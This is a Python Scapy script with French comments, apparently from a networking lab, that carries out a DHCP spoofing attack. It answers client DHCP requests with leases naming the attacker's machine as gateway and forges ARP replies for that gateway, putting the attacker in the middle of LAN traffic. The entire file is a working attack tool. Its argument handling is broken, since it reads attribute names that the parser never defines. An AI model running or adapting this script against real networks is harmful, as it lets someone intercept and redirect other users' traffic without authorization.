from scapy.all import *
import random
import argparse

#conf.iface = 'virbr1' # !! idem que l'autre script, c'est pour spécifier l'interface réseau des VM

default_INTERFACE = "enp1s0"  # nom de l'interface réseau à partir de laquel on va spoof le DHCP

default_ATTACKER_MAC = "52:54:00:da:33:63" # Adress MAC de la machine

parser = argparse.ArgumentParser(description="DHCP Spoofing, address MAC et Interface réseau renseignable")
parser.add_argument('--network-interface', type=str, default=default_INTERFACE, help="Interface réseau à travers laquel faire le spoofing (par défault: enp1s0)")
parser.add_argument('--my-MAC', type=str, default=default_ATTACKER_MAC, help="Mon adresse MAC (par défaut: 52:54:00:da:33:63)")

args = parser.parse_args()

INTERFACE = args.INTERFACE
ATTACKER_MAC = args.ATTACKER_MAC

subprocess.run(["ip", "addr", "add", "10.230.6.254/24", "dev", INTERFACE])

FAKE_SUBNET = "10.230.6.0/24"
FAKE_GATEWAY = "10.230.6.254"
FAKE_NETMASK = "255.255.255.0"

# Stocker les IP attribuées
leased_ips = {}

# Générer une IP disponible
def generate_fake_ip(): # => pas du tout opti pour attribuer une IP mais pour le TP ça fais le taff :)
    while True:
        fake_ip = "10.230.6." + str(random.randint(2, 253))
        if fake_ip not in leased_ips:
            return fake_ip

# Fonction récupéré dans le code source de scapy
def mac2str(mac):
    # type: (str) -> bytes
    return b"".join(chb(int(x, 16)) for x in plain_str(mac).split(':'))

# Fonction appelé par le sniffeur dans le cas ou le packet est un packet DHCP
# => Elle gère le cas d'un paquet DHCP de type Discover OU Request
def handle_dhcp(packet):
    if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
        fake_ip = generate_fake_ip()
        leased_ips[fake_ip] = packet[Ether].src  # Associer IP à MAC
        offer = Ether(dst=packet[Ether].src, src=ATTACKER_MAC) / \
                IP(src="10.230.6.254", dst="255.255.255.255") / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, xid=packet[BOOTP].xid, yiaddr=fake_ip, chaddr=packet[BOOTP].chaddr) / \
                DHCP(options=[("message-type", "offer"), 
                              ("server_id", FAKE_GATEWAY), 
                              ("lease_time", 3600), 
                              ("subnet_mask", FAKE_NETMASK), 
                              ("router", FAKE_GATEWAY), 
                              ("name_server", "1.1.1.1"),
                              ("broadcast_address", "10.230.6.255"),
                              "end"])
        sendp(offer, iface=INTERFACE, verbose=False)
        print(f"[+] Offered {fake_ip} to {packet[Ether].src}")

    elif DHCP in packet and packet[DHCP].options[0][1] == 3:  # DHCP Request
        requested_ip=""
        for option in packet[DHCP].options: # Je fais ça pck l'ordre des options n'était pas toujours pareil D:
            if option[0] == "requested_addr":
              requested_ip = option[1]  # L'adresse demandée
        if requested_ip in leased_ips:
            ack = Ether(dst=packet[Ether].src, src=ATTACKER_MAC) / \
                IP(src="10.230.6.254", dst="255.255.255.255") / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, xid=packet[BOOTP].xid, yiaddr=requested_ip, chaddr=packet[BOOTP].chaddr) / \
                DHCP(options=[("message-type", "ack"), 
                              ("server_id", FAKE_GATEWAY), 
                              ("lease_time", 3600), 
                              ("subnet_mask", FAKE_NETMASK), 
                              ("router", FAKE_GATEWAY), 
                              ("name_server", "1.1.1.1"),
                              ("broadcast_address", "10.230.6.255"),
                              "end"])
            sendp(ack, iface=INTERFACE, verbose=False)
            print(f"[+] ACK sent to {requested_ip} for {packet[Ether].src}")

# Fonction appelé par le sniffeur dans le cas ou le packet est un packet ARP qui
def handle_arp(packet):
    # Si le paquet ARP est de type "question" et qu'il recherche la MAC de la FAKE_GATEWAY, alors on répond en disant que c'est nous :)
    if ARP in packet and packet[ARP].op == 1 and packet[ARP].pdst == FAKE_GATEWAY:
        arp_reply = Ether(src=ATTACKER_MAC, dst=packet[ARP].hwsrc) / \
            ARP(op=2, pdst=packet[ARP].psrc, hwdst=packet[ARP].hwsrc, psrc=FAKE_GATEWAY, hwsrc=ATTACKER_MAC)
        sendp(arp_reply, iface=INTERFACE, verbose=False)
        print(f"[+] Sent ARP reply: {FAKE_GATEWAY} is at {ATTACKER_MAC}")

print("[*] DHCP Spoofing attack started...")
sniff(filter="udp and (port 67 or 68) or arp", iface=INTERFACE, prn=lambda x: handle_dhcp(x) if DHCP in x else handle_arp(x))

